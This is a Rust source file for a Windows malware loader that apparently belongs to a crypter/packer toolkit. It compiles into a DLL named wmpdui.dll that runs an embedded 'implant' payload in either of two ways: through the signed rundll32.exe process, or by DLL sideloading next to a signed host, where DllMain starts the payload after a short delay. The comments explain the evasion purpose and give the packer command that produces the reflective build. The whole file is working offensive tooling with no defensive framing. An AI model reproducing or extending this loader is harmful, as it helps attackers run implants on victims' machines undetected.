//! Sideload / LOLBin DLL loader.
//!
//! - `rundll32.exe wmpdui.dll,Run` runs the embedded payload in the signed
//!   `rundll32.exe` process (no temp EXE).
//! - Dropping this DLL next to a signed host that loads `wmpdui.dll` runs it
//!   via `DllMain` after a short delay (loader-lock safe).
//!
//! The packer must target this directory with `--reflective`:
//!   crypter-packer <implant.exe> crypter/dll-loader/src --reflective
#![cfg(windows)]

mod gen;
#[path = "../../loader/src/win/mod.rs"]
mod win;

use std::sync::atomic::{AtomicBool, Ordering};

static STARTED: AtomicBool = AtomicBool::new(false);

fn once() {
    if STARTED.swap(true, Ordering::SeqCst) {
        return;
    }
    win::run_payload(false);
}

#[no_mangle]
pub extern "system" fn DllMain(_h: isize, reason: u32, _r: *mut core::ffi::c_void) -> i32 {
    if reason == 1 {
        std::thread::spawn(|| {
            // Give the loader lock time to clear before touching the payload.
            std::thread::sleep(std::time::Duration::from_secs(2));
            once();
        });
    }
    1
}

#[no_mangle]
pub extern "system" fn Run() {
    once();
}
